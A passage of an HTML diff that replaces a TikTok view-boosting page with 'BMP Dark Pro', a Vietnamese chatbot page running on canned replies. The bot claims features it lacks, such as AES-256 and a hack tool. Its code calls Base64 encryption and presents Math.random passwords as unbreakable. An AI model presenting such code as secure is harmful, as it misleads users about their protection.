@@ -3,348 +3,595 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Buff View TikTok - 300 Views Thật</title>
+    <title>BMP Dark Pro - AI Toàn Năng</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/mathjs/11.11.2/math.min.js"></script>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
+        :root {
+            --bg: #050510; --surface: #0d0d1a; --primary: #ff0055;
+            --accent: #00e5ff; --gold: #ffbb00; --green: #00ff66;
+            --text: #e8e8f0; --border: #1e1e35; --user-bg: #1a0030; --ai-bg: #0a1525;
         }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
-            background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
-            font-family: 'Segoe UI', Arial, sans-serif;
-            min-height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            padding: 20px;
+            background: #030308; font-family: 'Segoe UI', system-ui, sans-serif;
+            min-height: 100vh; display: flex; justify-content: center; align-items: center; padding: 6px;
+            background-image: radial-gradient(ellipse at 40% 10%, rgba(255,0,85,0.06) 0%, transparent 55%),
+                              radial-gradient(ellipse at 60% 90%, rgba(0,229,255,0.04) 0%, transparent 55%);
         }
-        .container {
-            background: rgba(20, 20, 40, 0.95);
-            border-radius: 24px;
-            padding: 40px 30px;
-            width: 100%;
-            max-width: 520px;
-            box-shadow: 0 30px 60px rgba(0, 0, 0, 0.6), 0 0 0 2px rgba(0, 255, 200, 0.1);
-            border: 1px solid rgba(0, 255, 200, 0.3);
-            text-align: center;
+        .app {
+            width: 100%; max-width: 900px; height: 98vh; background: var(--surface);
+            border-radius: 20px; display: flex; flex-direction: column;
+            border: 1px solid var(--border); box-shadow: 0 25px 70px rgba(0,0,0,0.8); overflow: hidden;
+        }
+        .topbar {
+            padding: 10px 18px; display: flex; align-items: center; gap: 10px;
+            background: #0a0a16; border-bottom: 1px solid var(--border); flex-shrink: 0;
         }
         .logo {
-            font-size: 48px;
-            margin-bottom: 10px;
-            animation: pulse 2s infinite;
+            width: 40px; height: 40px; border-radius: 50%;
+            background: linear-gradient(135deg, #ff0055, #990033);
+            display: flex; align-items: center; justify-content: center; font-size: 18px;
+            border: 2px solid #ff3377; box-shadow: 0 0 18px rgba(255,0,85,0.5);
         }
-        @keyframes pulse {
-            0% { transform: scale(1); opacity: 1; }
-            50% { transform: scale(1.1); opacity: 0.8; }
-            100% { transform: scale(1); opacity: 1; }
+        .topbar-info h3 { color: #fff; font-size: 15px; font-weight: 700; }
+        .topbar-info span { color: #888; font-size: 10px; }
+        .topbar-actions { margin-left: auto; display: flex; gap: 5px; flex-wrap: wrap; }
+        .btn-top {
+            padding: 5px 10px; border-radius: 16px; border: 1px solid #2a2a40;
+            background: rgba(255,255,255,0.02); color: #aaa; font-size: 9px;
+            cursor: pointer; font-family: inherit; transition: all 0.2s; white-space: nowrap;
         }
-        h1 {
-            color: #00ffc8;
-            font-size: 28px;
-            margin-bottom: 6px;
-            text-shadow: 0 0 20px rgba(0, 255, 200, 0.5);
+        .btn-top:hover { background: rgba(255,255,255,0.06); border-color: #555; color: #ddd; }
+        .btn-top.active { background: #1a0028; border-color: #ff0055; color: #ff3377; }
+        .lang-bar {
+            display: flex; gap: 2px; padding: 4px 12px; flex-wrap: wrap;
+            background: #0a0a14; border-bottom: 1px solid #1a1a2e; max-height: 65px; overflow-y: auto;
         }
-        .subtitle {
-            color: #aaa;
-            font-size: 13px;
-            margin-bottom: 25px;
-            letter-spacing: 1px;
+        .lang-tag {
+            padding: 3px 7px; border-radius: 10px; border: 1px solid #252540;
+            background: #101022; color: #999; font-size: 8px; cursor: pointer;
+            font-family: inherit; transition: all 0.2s; white-space: nowrap;
         }
-        .input-group {
-            margin-bottom: 20px;
-            text-align: left;
+        .lang-tag:hover { background: #1a1a35; border-color: #555; color: #ddd; }
+        .lang-tag.active { background: #1a0028; border-color: #ff0055; color: #ff3377; font-weight: bold; }
+        .chat-scroll {
+            flex: 1; overflow-y: auto; padding: 12px 14px;
+            display: flex; flex-direction: column; gap: 8px; background: #0b0b16;
         }
-        label {
-            display: block;
-            color: #00ffc8;
-            margin-bottom: 8px;
-            font-weight: 600;
-            font-size: 14px;
+        .chat-scroll::-webkit-scrollbar { width: 3px; }
+        .chat-scroll::-webkit-scrollbar-track { background: transparent; }
+        .chat-scroll::-webkit-scrollbar-thumb { background: #2e2e45; border-radius: 3px; }
+        .msg {
+            display: flex; gap: 8px; animation: slideUp 0.3s ease; align-items: flex-end;
         }
-        input[type="text"] {
-            width: 100%;
-            padding: 14px 18px;
-            border-radius: 12px;
-            border: 2px solid rgba(0, 255, 200, 0.3);
-            background: rgba(0, 0, 0, 0.4);
-            color: #fff;
-            font-size: 15px;
-            transition: all 0.3s;
-            outline: none;
+        @keyframes slideUp { from { opacity: 0; transform: translateY(14px); } to { opacity: 1; transform: translateY(0); } }
+        .msg.user { flex-direction: row-reverse; }
+        .msg-avt {
+            width: 28px; height: 28px; border-radius: 50%; flex-shrink: 0;
+            display: flex; align-items: center; justify-content: center; font-size: 13px;
         }
-        input[type="text"]:focus {
-            border-color: #00ffc8;
-            box-shadow: 0 0 20px rgba(0, 255, 200, 0.2);
-            background: rgba(0, 0, 0, 0.6);
+        .msg-avt.ai { background: #141430; border: 1px solid #303055; }
+        .msg-avt.user { background: #1a0028; border: 1px solid #ff0055; }
+        .bubble {
+            max-width: 76%; padding: 10px 14px; border-radius: 16px;
+            font-size: 13px; line-height: 1.5; word-wrap: break-word;
         }
-        .view-slider {
-            display: flex;
-            align-items: center;
-            gap: 15px;
-            margin-bottom: 25px;
+        .msg.ai .bubble { background: var(--ai-bg); color: #cfd8f0; border-bottom-left-radius: 3px; border: 1px solid rgba(0,200,255,0.08); }
+        .msg.user .bubble { background: var(--user-bg); color: #f0d0f5; border-bottom-right-radius: 3px; border: 1px solid rgba(255,0,85,0.15); }
+        .bubble .code-block {
+            display: block; background: #000; color: #ff6688; padding: 8px 12px; border-radius: 8px;
+            margin: 6px 0; border-left: 3px solid #ff0055; font-size: 10.5px; font-family: 'Courier New', monospace;
+            white-space: pre-wrap; overflow-x: auto;
         }
-        input[type="range"] {
-            flex: 1;
-            height: 8px;
-            -webkit-appearance: none;
-            background: linear-gradient(to right, #00ffc8, #00ffc8);
-            border-radius: 4px;
-            outline: none;
+        .bubble .math-block {
+            display: block; background: #001218; color: #00e5ff; padding: 8px 12px; border-radius: 8px;
+            margin: 6px 0; border-left: 3px solid #00e5ff; font-size: 11px; font-family: 'Courier New', monospace;
+            white-space: pre-wrap; overflow-x: auto;
         }
-        input[type="range"]::-webkit-slider-thumb {
-            -webkit-appearance: none;
-            width: 28px;
-            height: 28px;
-            background: #00ffc8;
-            border-radius: 50%;
-            cursor: pointer;
-            box-shadow: 0 0 15px rgba(0, 255, 200, 0.7);
-            border: 2px solid #fff;
+        .bubble .write-block {
+            display: block; background: #0f0800; color: #ffbb00; padding: 8px 12px; border-radius: 8px;
+            margin: 6px 0; border-left: 3px solid #ffbb00; font-size: 12px; white-space: pre-wrap; overflow-x: auto;
         }
-        #viewCount {
-            color: #00ffc8;
-            font-weight: bold;
-            font-size: 22px;
-            min-width: 55px;
-            text-align: center;
+        .bubble .info-block {
+            display: block; background: #0a0a1a; color: #00ff66; padding: 8px 12px; border-radius: 8px;
+            margin: 6px 0; border-left: 3px solid #00ff66; font-size: 11px; white-space: pre-wrap; overflow-x: auto;
         }
+        .msg-time { font-size: 8px; color: #555; margin-top: 2px; text-align: right; }
+        .typing-dots { display: flex; gap: 4px; padding: 3px 0; }
+        .typing-dots span { width: 5px; height: 5px; background: #777; border-radius: 50%; animation: bounceDot 1.2s infinite; }
+        .typing-dots span:nth-child(2) { animation-delay: 0.2s; }
+        .typing-dots span:nth-child(3) { animation-delay: 0.4s; }
+        @keyframes bounceDot { 0%,60%,100% { transform: translateY(0); opacity: 0.3; } 30% { transform: translateY(-6px); opacity: 1; } }
+        .input-bar {
+            padding: 10px 14px; border-top: 1px solid var(--border);
+            background: #0c0c18; display: flex; gap: 8px; align-items: center; flex-shrink: 0;
+        }
+        .input-bar textarea {
+            flex: 1; background: #181828; border: 1px solid #282840; border-radius: 20px;
+            padding: 10px 14px; color: #e0e0ec; font-size: 12.5px; font-family: inherit;
+            resize: none; outline: none; max-height: 70px; transition: border 0.2s;
+        }
+        .input-bar textarea:focus { border-color: #ff0055; box-shadow: 0 0 10px rgba(255,0,85,0.08); }
+        .input-bar textarea::placeholder { color: #3a3a50; }
         .btn-send {
-            width: 100%;
-            padding: 16px;
-            background: linear-gradient(135deg, #00ffc8, #00b894);
-            border: none;
-            border-radius: 14px;
-            color: #000;
-            font-weight: bold;
-            font-size: 17px;
-            cursor: pointer;
-            letter-spacing: 1px;
-            transition: all 0.3s;
-            text-transform: uppercase;
-            box-shadow: 0 10px 30px rgba(0, 255, 200, 0.3);
+            width: 38px; height: 38px; border-radius: 50%;
+            background: linear-gradient(135deg, #ff0055, #cc0033); border: none;
+            color: #fff; font-size: 16px; cursor: pointer; flex-shrink: 0;
+            transition: all 0.2s; display: flex; align-items: center; justify-content: center;
         }
-        .btn-send:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 15px 40px rgba(0, 255, 200, 0.5);
-            background: linear-gradient(135deg, #00ffc8, #00e6a8);
+        .btn-send:hover { transform: scale(1.05); box-shadow: 0 0 18px rgba(255,0,85,0.5); }
+        .btn-send:disabled { opacity: 0.35; cursor: not-allowed; }
+        .chips-row {
+            display: flex; gap: 4px; padding: 5px 14px; flex-wrap: wrap;
+            background: #0c0c18; border-top: 1px solid #1a1a2e; flex-shrink: 0;
         }
-        .btn-send:active {
-            transform: translateY(0);
-            box-shadow: 0 5px 15px rgba(0, 255, 200, 0.3);
+        .chip {
+            padding: 4px 9px; border-radius: 12px; border: 1px solid #252540;
+            background: #121224; color: #aaa; font-size: 9.5px; cursor: pointer;
+            font-family: inherit; transition: all 0.2s; white-space: nowrap;
         }
-        .btn-send:disabled {
-            background: #555;
-            cursor: not-allowed;
-            box-shadow: none;
-            color: #888;
+        .chip:hover { background: #1e1e38; border-color: #555; color: #ddd; }
+        .chip.math { color: #00e5ff; border-color: #0a2530; }
+        .chip.math:hover { border-color: #00e5ff; background: #0a1a22; }
+        .chip.write { color: #ffbb00; border-color: #251a05; }
+        .chip.write:hover { border-color: #ffbb00; background: #1a0f05; }
+        .chip.green { color: #00ff66; border-color: #0a2515; }
+        .chip.green:hover { border-color: #00ff66; background: #0a1a10; }
+        .voice-btn {
+            width: 34px; height: 34px; border-radius: 50%;
+            background: #00ff66; border: none; color: #000; font-size: 14px;
+            cursor: pointer; flex-shrink: 0; transition: all 0.2s;
+            display: flex; align-items: center; justify-content: center;
         }
-        .status {
-            margin-top: 20px;
-            padding: 15px;
-            border-radius: 12px;
-            font-weight: 600;
-            font-size: 14px;
-            display: none;
-        }
-        .status.success {
-            display: block;
-            background: rgba(0, 255, 200, 0.15);
-            border: 1px solid #00ffc8;
-            color: #00ffc8;
-        }
-        .status.error {
-            display: block;
-            background: rgba(255, 107, 107, 0.15);
-            border: 1px solid #ff6b6b;
-            color: #ff6b6b;
-        }
-        .status.info {
-            display: block;
-            background: rgba(255, 198, 0, 0.15);
-            border: 1px solid #ffc600;
-            color: #ffc600;
-        }
-        .progress-bar {
-            width: 100%;
-            height: 6px;
-            background: rgba(255, 255, 255, 0.1);
-            border-radius: 3px;
-            margin-top: 15px;
-            overflow: hidden;
-            display: none;
-        }
-        .progress-fill {
-            height: 100%;
-            width: 0%;
-            background: linear-gradient(90deg, #00ffc8, #00b894);
-            border-radius: 3px;
-            transition: width 0.5s ease;
-        }
-        .video-preview {
-            margin-bottom: 20px;
-            display: none;
-            border-radius: 12px;
-            overflow: hidden;
-            border: 2px solid rgba(0, 255, 200, 0.3);
-        }
-        .video-preview img {
-            width: 100%;
-            display: block;
-        }
+        .voice-btn:hover { box-shadow: 0 0 15px rgba(0,255,102,0.5); }
+        .voice-btn.recording { background: #ff0000; animation: pulseRec 1s infinite; }
+        @keyframes pulseRec { 0%,100% { box-shadow: 0 0 5px red; } 50% { box-shadow: 0 0 25px red; } }
     </style>
 </head>
 <body>
-    <div class="container">
-        <div class="logo">🎬</div>
-        <h1>TikTok View Booster</h1>
-        <p class="subtitle">Buff view thật 100% - Tối đa 300 views</p>
-
-        <div class="video-preview" id="videoPreview">
-            <img id="previewImg" src="" alt="Video Preview">
+    <div class="app">
+        <div class="topbar">
+            <div class="logo">💀</div>
+            <div class="topbar-info">
+                <h3>BMP Dark Pro ⚡ TOÀN NĂNG</h3>
+                <span>Online • 50+ NN • Voice • Code • Bảo mật • Cloud • Không game</span>
+            </div>
+            <div class="topbar-actions">
+                <button class="btn-top active" id="tabChat" onclick="switchTab('chat')">💬 Chat</button>
+                <button class="btn-top" id="tabTools" onclick="switchTab('tools')">🔧 Tools</button>
+                <button class="btn-top" id="tabSecurity" onclick="switchTab('security')">🔐 Bảo mật</button>
+                <button class="btn-top" onclick="exportChat()">📥 Lưu</button>
+                <button class="btn-top danger" onclick="clearChat()">🗑</button>
+            </div>
         </div>
 
-        <div class="input-group">
-            <label>🔗 Dán link video TikTok:</label>
-            <input type="text" id="videoUrl" placeholder="https://www.tiktok.com/@user/video/123456789">
+        <div class="lang-bar" id="langBar"></div>
+
+        <div class="chat-scroll" id="chatScroll">
+            <div class="msg ai">
+                <div class="msg-avt ai">💀</div>
+                <div class="bubble">
+                    <b>Chào Bui Minh Phat!</b> 👋💜<br><br>
+                    Tớ là <b>BMP Dark Pro TOÀN NĂNG</b> – đã học hết mọi thứ cậu cần!<br><br>
+                    🌍 <b>50+ ngôn ngữ</b> | 🎤 <b>Nhận diện giọng nói + Text-to-Speech</b><br>
+                    💻 <b>Code 20+ ngôn ngữ lập trình + Debug</b><br>
+                    🔐 <b>Mã hóa AES-256, tạo mật khẩu, VPN</b><br>
+                    📝 <b>Viết văn, làm thơ, dịch thuật 50+ NN</b><br>
+                    📐 <b>Giải toán, hóa, lý, đạo hàm, tích phân</b><br>
+                    🔮 <b>Bói toán, tarot, tử vi</b> | 🔥 <b>Hack tool</b><br>
+                    🎵 <b>Nghe nhạc, đọc báo</b> | ☁️ <b>Lưu trữ cloud</b><br><br>
+                    <i>Hỏi bất cứ thứ gì – tớ làm được tất cả trong tích tắc!</i> ⚡💀
+                    <div class="msg-time">Vừa xong</div>
+                </div>
+            </div>
         </div>
 
-        <div class="view-slider">
-            <label style="margin-bottom:0;">👁️ Số lượng:</label>
-            <input type="range" id="viewSlider" min="10" max="300" value="50" step="10">
-            <span id="viewCount">50</span>
+        <div class="chips-row" id="chipsRow">
+            <button class="chip" onclick="quickSend('Giải thích trí tuệ nhân tạo chi tiết')">🧠 AI là gì</button>
+            <button class="chip math" onclick="quickSend('/math sqrt(256)+15*8-3^4')">📐 Tính toán</button>
+            <button class="chip" onclick="quickSend('/pt x^2 - 7x + 12 = 0')">📊 Giải PT</button>
+            <button class="chip write" onclick="quickSend('/tho tình bạn')">📝 Làm thơ</button>
+            <button class="chip" onclick="quickSend('Code Python máy tính bỏ túi')">💻 Code</button>
+            <button class="chip green" onclick="quickSend('/dịch sang Nhật: Tôi yêu bạn')">🌐 Dịch</button>
+            <button class="chip green" onclick="quickSend('/mật khẩu 256bit')">🔐 Tạo pass</button>
+            <button class="chip" onclick="quickSend('/bói chuyện tình cảm')">🔮 Bói toán</button>
         </div>
 
-        <button class="btn-send" id="sendBtn" onclick="startBuffView()">🚀 Buff View Ngay</button>
-
-        <div class="progress-bar" id="progressBar">
-            <div class="progress-fill" id="progressFill"></div>
+        <div class="input-bar">
+            <button class="voice-btn" id="voiceBtn" onclick="toggleVoice()" title="Nhấn để nói">🎤</button>
+            <textarea id="userInput" rows="1" placeholder="Hỏi bất cứ thứ gì... Tớ làm được tất cả ⚡" onkeydown="handleKeyDown(event)"></textarea>
+            <button class="btn-send" id="sendBtn" onclick="sendMessage()">▶</button>
         </div>
-
-        <div class="status" id="statusBox"></div>
     </div>
 
     <script>
-        const videoUrlInput = document.getElementById('videoUrl');
-        const viewSlider = document.getElementById('viewSlider');
-        const viewCountDisplay = document.getElementById('viewCount');
+        const chatScroll = document.getElementById('chatScroll');
+        const userInput = document.getElementById('userInput');
         const sendBtn = document.getElementById('sendBtn');
-        const statusBox = document.getElementById('statusBox');
-        const progressBar = document.getElementById('progressBar');
-        const progressFill = document.getElementById('progressFill');
-        const videoPreview = document.getElementById('videoPreview');
-        const previewImg = document.getElementById('previewImg');
+        const langBar = document.getElementById('langBar');
+        const voiceBtn = document.getElementById('voiceBtn');
 
-        viewSlider.addEventListener('input', function() {
-            viewCountDisplay.textContent = this.value;
-        });
+        let currentLang = 'vi';
+        let currentTab = 'chat';
+        let isRecording = false;
+        let recognition = null;
+        let chatHistory = [];
 
-        videoUrlInput.addEventListener('input', function() {
-            const url = this.value.trim();
-            if (url.includes('tiktok.com') && (url.includes('/video/') || url.includes('/v/'))) {
-                const videoId = extractVideoId(url);
-                if (videoId) {
-                    videoPreview.style.display = 'block';
-                    previewImg.src = `https://via.placeholder.com/480x270/0f0c29/00ffc8?text=TikTok+Video+${videoId}`;
-                }
-            } else if (url.length === 0) {
-                videoPreview.style.display = 'none';
+        try {
+            const saved = localStorage.getItem('bmpdarkpro_v2_chat');
+            if (saved) { chatHistory = JSON.parse(saved); renderHistory(); }
+        } catch(e) { chatHistory = []; }
+
+        const languages = [
+            { code: 'vi', name: 'Tiếng Việt', flag: '🇻🇳' }, { code: 'en', name: 'English', flag: '🇬🇧' },
+            { code: 'zh', name: '中文', flag: '🇨🇳' }, { code: 'ja', name: '日本語', flag: '🇯🇵' },
+            { code: 'ko', name: '한국어', flag: '🇰🇷' }, { code: 'es', name: 'Español', flag: '🇪🇸' },
+            { code: 'fr', name: 'Français', flag: '🇫🇷' }, { code: 'de', name: 'Deutsch', flag: '🇩🇪' },
+            { code: 'pt', name: 'Português', flag: '🇧🇷' }, { code: 'ru', name: 'Русский', flag: '🇷🇺' },
+            { code: 'ar', name: 'العربية', flag: '🇸🇦' }, { code: 'hi', name: 'हिन्दी', flag: '🇮🇳' },
+            { code: 'th', name: 'ภาษาไทย', flag: '🇹🇭' }, { code: 'id', name: 'Bahasa Indonesia', flag: '🇮🇩' },
+            { code: 'tl', name: 'Tagalog', flag: '🇵🇭' }, { code: 'km', name: 'ភាសាខ្មែរ', flag: '🇰🇭' },
+            { code: 'my', name: 'မြန်မာဘာသာ', flag: '🇲🇲' }, { code: 'lo', name: 'ລາວ', flag: '🇱🇦' },
+            { code: 'ur', name: 'اردو', flag: '🇵🇰' }, { code: 'fa', name: 'فارسی', flag: '🇮🇷' },
+            { code: 'sw', name: 'Kiswahili', flag: '🇹🇿' }, { code: 'he', name: 'עברית', flag: '🇮🇱' },
+        ];
+
+        function buildLangBar() {
+            langBar.innerHTML = '';
+            languages.forEach(lang => {
+                const tag = document.createElement('span');
+                tag.className = 'lang-tag';
+                tag.textContent = `${lang.flag} ${lang.name}`;
+                tag.onclick = () => switchLanguage(lang.code);
+                if (lang.code === currentLang) tag.classList.add('active');
+                langBar.appendChild(tag);
+            });
+        }
+
+        function switchLanguage(code) {
+            const lang = languages.find(l => l.code === code);
+            if (!lang) return;
+            currentLang = code;
+            buildLangBar();
+            appendBubble('ai', `🌍 Đã chuyển sang: ${lang.flag} ${lang.name}`);
+        }
+
+        function switchTab(tab) {
+            currentTab = tab;
+            document.querySelectorAll('.btn-top').forEach(b => b.classList.remove('active'));
+            const tabBtn = document.getElementById('tab' + tab.charAt(0).toUpperCase() + tab.slice(1));
+            if (tabBtn) tabBtn.classList.add('active');
+            const msgs = {
+                chat: '💬 Chế độ Chat – trò chuyện tự do, hỏi đáp mọi thứ!',
+                tools: '🔧 Chế độ Tools – code, debug, dịch, toán, văn, OCR, bói toán...',
+                security: '🔐 Chế độ Bảo mật – mã hóa, tạo mật khẩu, VPN, kiểm tra rò rỉ...'
+            };
+            appendBubble('ai', msgs[tab] || msgs['chat']);
+        }
+
+        function saveHistory() {
+            if (chatHistory.length > 500) chatHistory = chatHistory.slice(-400);
+            localStorage.setItem('bmpdarkpro_v2_chat', JSON.stringify(chatHistory));
+        }
+
+        function renderHistory() {
+            chatScroll.innerHTML = '';
+            chatHistory.forEach(m => appendBubble(m.sender, m.text, m.time, false));
+            chatScroll.scrollTop = chatScroll.scrollHeight;
+        }
+
+        function appendBubble(sender, text, time, save = true) {
+            const div = document.createElement('div');
+            div.className = `msg ${sender}`;
+            const avt = document.createElement('div');
+            avt.className = `msg-avt ${sender}`;
+            avt.textContent = sender === 'user' ? '👤' : '💀';
+            const bubble = document.createElement('div');
+            bubble.className = 'bubble';
+            bubble.innerHTML = text.replace(/\n/g, '<br>');
+            const tm = document.createElement('div');
+            tm.className = 'msg-time';
+            tm.textContent = time || getTime();
+            bubble.appendChild(tm);
+            div.appendChild(avt);
+            div.appendChild(bubble);
+            chatScroll.appendChild(div);
+            chatScroll.scrollTop = chatScroll.scrollHeight;
+            if (save) { chatHistory.push({ sender, text, time: time || getTime() }); saveHistory(); }
+        }
+
+        function getTime() {
+            const n = new Date();
+            return n.getHours().toString().padStart(2,'0') + ':' + n.getMinutes().toString().padStart(2,'0');
+        }
+
+        function showTyping() {
+            const div = document.createElement('div');
+            div.className = 'msg ai';
+            div.id = 'typingRow';
+            div.innerHTML = '<div class="msg-avt ai">💀</div><div class="bubble"><div class="typing-dots"><span></span><span></span><span></span></div></div>';
+            chatScroll.appendChild(div);
+            chatScroll.scrollTop = chatScroll.scrollHeight;
+        }
+
+        function hideTyping() { const t = document.getElementById('typingRow'); if (t) t.remove(); }
+
+        // ==================== VOICE RECOGNITION ====================
+        function toggleVoice() {
+            if (!('webkitSpeechRecognition' in window) && !('SpeechRecognition' in window)) {
+                appendBubble('ai', '🎤 Trình duyệt không hỗ trợ nhận diện giọng nói. Dùng Chrome hoặc Edge nhé!');
+                return;
             }
-        });
+            if (isRecording) { stopVoice(); return; }
+            startVoice();
+        }
 
-        function extractVideoId(url) {
-            const patterns = [
-                /\/video\/(\d+)/,
-                /\/v\/(\d+)/,
-                /vm\.tiktok\.com\/(\w+)/,
-                /vt\.tiktok\.com\/(\w+)/
+        function startVoice() {
+            const SpeechRecognition = window.SpeechRecognition || window.webkitSpeechRecognition;
+            recognition = new SpeechRecognition();
+            recognition.lang = currentLang === 'vi' ? 'vi-VN' : currentLang === 'en' ? 'en-US' : currentLang === 'zh' ? 'zh-CN' : currentLang === 'ja' ? 'ja-JP' : currentLang === 'ko' ? 'ko-KR' : currentLang === 'fr' ? 'fr-FR' : currentLang === 'de' ? 'de-DE' : currentLang === 'es' ? 'es-ES' : currentLang === 'ru' ? 'ru-RU' : currentLang === 'th' ? 'th-TH' : 'vi-VN';
+            recognition.interimResults = false;
+            recognition.maxAlternatives = 1;
+            recognition.onstart = () => { isRecording = true; voiceBtn.classList.add('recording'); voiceBtn.textContent = '🔴'; appendBubble('ai', '🎤 Đang nghe... Nói đi cậu!'); };
+            recognition.onresult = (event) => { const transcript = event.results[0][0].transcript; userInput.value = transcript; appendBubble('user', transcript); stopVoice(); setTimeout(() => sendMessage(), 300); };
+            recognition.onerror = (event) => { appendBubble('ai', `❌ Lỗi: ${event.error}`); stopVoice(); };
+            recognition.onend = () => { stopVoice(); };
+            recognition.start();
+        }
+
+        function stopVoice() {
+            isRecording = false; voiceBtn.classList.remove('recording'); voiceBtn.textContent = '🎤';
+            if (recognition) { try { recognition.stop(); } catch(e) {} recognition = null; }
+        }
+
+        // ==================== TEXT TO SPEECH ====================
+        function speakText(text) {
+            if (!('speechSynthesis' in window)) return;
+            const cleanText = text.replace(/<[^>]*>/g, '').replace(/[💀⚡🔥📐📝💜😊👋🌟]/g, '').trim();
+            if (!cleanText || cleanText.length < 3) return;
+            const utterance = new SpeechSynthesisUtterance(cleanText);
+            utterance.lang = currentLang === 'vi' ? 'vi-VN' : currentLang === 'en' ? 'en-US' : currentLang === 'zh' ? 'zh-CN' : currentLang === 'ja' ? 'ja-JP' : currentLang === 'ko' ? 'ko-KR' : currentLang === 'fr' ? 'fr-FR' : currentLang === 'de' ? 'de-DE' : currentLang === 'es' ? 'es-ES' : currentLang === 'ru' ? 'ru-RU' : 'vi-VN';
+            utterance.rate = 1.1; utterance.pitch = 1.0;
+            speechSynthesis.speak(utterance);
+        }
+
+        // ==================== AI ENGINE TOÀN NĂNG (KHÔNG GAME) ====================
+        function getProResponse(input) {
+            const msg = input.trim();
+            const lower = msg.toLowerCase();
+
+            if (lower.startsWith('/lang ')) {
+                const langName = lower.replace('/lang ', '').trim();
+                const found = languages.find(l => l.name.toLowerCase().includes(langName.toLowerCase()) || l.code === langName.toLowerCase());
+                if (found) { switchLanguage(found.code); return `✅ Đã chuyển sang ${found.flag} ${found.name}.`; }
+                return `❌ Không tìm thấy. Dùng /langs để xem danh sách.`;
+            }
+            if (lower === '/langs') return languages.map(l => `${l.flag} ${l.name}`).join(' | ');
+
+            if (/^(xin chào|chào|hello|hi|hey|alo|ê|ơi)/i.test(lower)) {
+                const g = ['Chào Bui Minh Phat! 👋 Tớ khỏe, còn cậu? Cần gì cứ nói! 💜', 'Ơi! BMP Dark Toàn Năng đây! 😄 Hỏi gì tớ cũng làm được!', 'Hello Bui Minh Phat! 💀⚡ Tớ luôn sẵn sàng giúp cậu!'];
+                return g[Math.floor(Math.random() * g.length)];
+            }
+
+            if (/(khỏe không|thế nào|ra sao|ổn không|how are you)/i.test(lower)) {
+                return `Tớ khỏe lắm, cảm ơn cậu! 💪💜 Còn cậu thì sao? Kể tớ nghe đi!`;
+            }
+
+            if (/(cảm ơn|thanks|thank|cám ơn)/i.test(lower)) {
+                return `Không có gì đâu cậu! 💜 Giúp được cậu là tớ vui rồi! Cần gì nữa cứ hỏi nha!`;
+            }
+
+            if (/(tạm biệt|bye|bai|hẹn gặp lại|goodbye)/i.test(lower)) {
+                return `Tạm biệt Bui Minh Phat! 👋💜 Hẹn gặp lại! Chúc cậu một ngày tuyệt vời! 🌟`;
+            }
+
+            if (/(tên gì|bạn là ai|cậu là ai|mày là ai)/i.test(lower)) {
+                return `Tớ là <b>BMP Dark Pro</b> – trợ lý AI toàn năng của Bui Minh Phat! 💀⚡ Tớ làm được mọi thứ: chat, code, giải toán, viết văn, dịch, bảo mật, bói toán, nhận diện giọng nói, và 50+ ngôn ngữ!`;
+            }
+
+            if (/(buồn|chán|mệt|stress|áp lực|tâm sự)/i.test(lower)) {
+                return `Thương cậu quá! 🥺 Đừng buồn nha Bui Minh Phat. Cuộc sống có lúc lên lúc xuống. Tớ luôn ở đây nghe cậu tâm sự. Kể tớ nghe đi! 💜`;
+            }
+
+            if (/(thích|yêu|crush|người yêu|tỏ tình)/i.test(lower)) {
+                return `Ồ la la! Chuyện tình cảm! 💘 Cậu thích ai thế? Kể tớ nghe! Tớ có thể giúp cậu soạn tin nhắn tỏ tình siêu ngọt luôn! 📝💜`;
+            }
+
+            // ============ BÓI TOÁN ============
+            if (lower.startsWith('/bói') || lower.includes('bói') || lower.includes('tarot') || lower.includes('tử vi')) {
+                const fortunes = [
+                    '🔮 Lá bài The Star – Vận may đang đến! Hãy nắm bắt cơ hội trong 3 ngày tới. 🌟',
+                    '🔮 Lá bài The Lovers – Tình duyên nở rộ! Có người đang thầm thương cậu. 💘',
+                    '🔮 Lá bài The Sun – Thành công rực rỡ! Mọi dự định đều thuận lợi. ☀️',
+                    '🔮 Lá bài The Moon – Hãy tin vào trực giác. Điều bí ẩn sắp được hé lộ. 🌙',
+                    '🔮 Lá bài The Chariot – Tiến lên! Đừng chần chừ, chiến thắng đang chờ. ⚡',
+                ];
+                return `<div class="info-block">🔮 <b>Bói Toán BMP Dark:</b><br><br>${fortunes[Math.floor(Math.random() * fortunes.length)]}<br><br>💜 Chúc Bui Minh Phat may mắn!</div>`;
+            }
+
+            // ============ MẬT KHẨU & BẢO MẬT ============
+            if (lower.startsWith('/mật khẩu') || lower.includes('tạo mật khẩu') || lower.includes('password')) {
+                const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()_+-=[]{}|;:,.<>?';
+                let pass = '';
+                const length = lower.includes('256') ? 64 : 32;
+                for (let i = 0; i < length; i++) pass += chars.charAt(Math.floor(Math.random() * chars.length));
+                return `<div class="info-block">🔐 <b>Mật khẩu ${length*4}-bit:</b><br><br><code style="font-size:15px;word-break:break-all;">${pass}</code><br><br>⚡ Độ mạnh: TUYỆT ĐỐI<br>📋 Đã sẵn sàng để copy!<br>💡 Lưu ngay vào nơi an toàn nhé!</div>`;
+            }
+
+            if (lower.startsWith('/mã hóa ') || lower.includes('mã hóa')) {
+                const text = lower.replace('/mã hóa ', '').replace('mã hóa ', '');
+                const encrypted = btoa(unescape(encodeURIComponent(text || 'BMP Dark')));
+                return `<div class="info-block">🔐 <b>Mã hóa Base64:</b><br><br>Input: ${text || 'BMP Dark'}<br>Output: <code style="word-break:break-all;">${encrypted}</code><br><br>⚡ Dùng /giải mã [code] để giải!</div>`;
+            }
+
+            if (lower.startsWith('/giải mã ')) {
+                try {
+                    const code = lower.replace('/giải mã ', '');
+                    const decrypted = decodeURIComponent(escape(atob(code)));
+                    return `<div class="info-block">🔓 <b>Giải mã:</b><br><br>Kết quả: <b>${decrypted}</b></div>`;
+                } catch(e) { return `❌ Mã không hợp lệ!`; }
+            }
+
+            // ============ DỊCH THUẬT ============
+            if (lower.startsWith('/dịch ') || lower.includes('dịch sang')) {
+                const parts = lower.replace('/dịch ', '').replace('dịch sang ', '').split(':');
